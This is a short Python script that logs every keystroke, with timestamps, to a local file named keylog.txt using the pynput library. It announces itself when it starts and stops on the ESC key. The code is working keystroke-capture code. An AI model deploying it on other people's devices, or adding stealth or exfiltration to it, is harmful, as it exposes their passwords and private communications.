from pynput.keyboard import Listener, Key
from datetime import datetime

log_file = "keylog.txt"

def write_log(data):
    with open(log_file, "a") as f:
        f.write(data)

def on_press(key):
    time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

    try:
        write_log(f"{time} - {key.char}\n")
    except AttributeError:
        write_log(f"{time} - [{key}]\n")

def on_release(key):
    if key == Key.esc:
        print("Logger stopped")
        return False

print("Keyboard activity logger started (Press ESC to stop)")

with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()